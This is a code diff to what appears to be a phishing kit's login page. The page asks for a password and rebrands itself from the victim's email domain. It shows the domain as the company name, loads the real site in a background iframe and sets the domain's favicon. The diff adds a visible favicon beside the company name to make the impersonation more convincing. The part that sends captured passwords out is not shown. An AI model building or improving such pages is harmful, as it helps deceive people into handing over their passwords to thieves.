@@ -138,12 +138,26 @@
             width: 100%;
         }
         
-        /* Company name at top */
+        /* Company header with favicon */
+        .company-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 2rem;
+        }
+        
+        #company-favicon {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            object-fit: contain;
+        }
+        
         #company-name {
             font-size: 1.5rem;
             font-weight: 600;
             color: #0b1c2e;
-            margin-bottom: 2rem;
+            line-height: 1.2;
         }
         
         .signin-label {
@@ -297,8 +311,11 @@
     
     <!-- Login Card -->
     <div class="login-card">
-        <!-- Company name at top - DYNAMIC -->
-        <div id="company-name">Finemancorp.Com</div>
+        <!-- Company header with favicon - DYNAMIC -->
+        <div class="company-header">
+            <img id="company-favicon" src="" alt="logo" class="me-2">
+            <div id="company-name">Finemancorp.Com</div>
+        </div>
         
         <!-- Sign in label -->
         <div class="signin-label">PLEASE ENTER YOUR PASSWORD</div>
@@ -373,7 +390,7 @@ document.addEventListener("DOMContentLoaded", function() {
             const extension = domainParts[1];
             const domainDisplay = mainPart.charAt(0).toUpperCase() + mainPart.slice(1) + '.' + extension;
             
-            // Update ONLY the dynamic elements
+            // Update dynamic elements
             document.getElementById("company-name").textContent = domainDisplay;
             document.getElementById("email-display").textContent = email;
             document.getElementById("privacy-domain").textContent = domainDisplay;
@@ -382,11 +399,14 @@ document.addEventListener("DOMContentLoaded", function() {
             const bgUrl = domain.startsWith("http") ? domain : "https://" + domain;
             document.getElementById("background-iframe").src = bgUrl;
             
-            // Update favicon
+            // Update favicon for browser tab
             const favicon = document.createElement('link');
             favicon.rel = 'icon';
             favicon.href = `https://www.google.com/s2/favicons?domain=${domain}`;
             document.head.appendChild(favicon);
+            
+            // Show company favicon next to domain name
+            document.getElementById("company-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
         }
     }
     
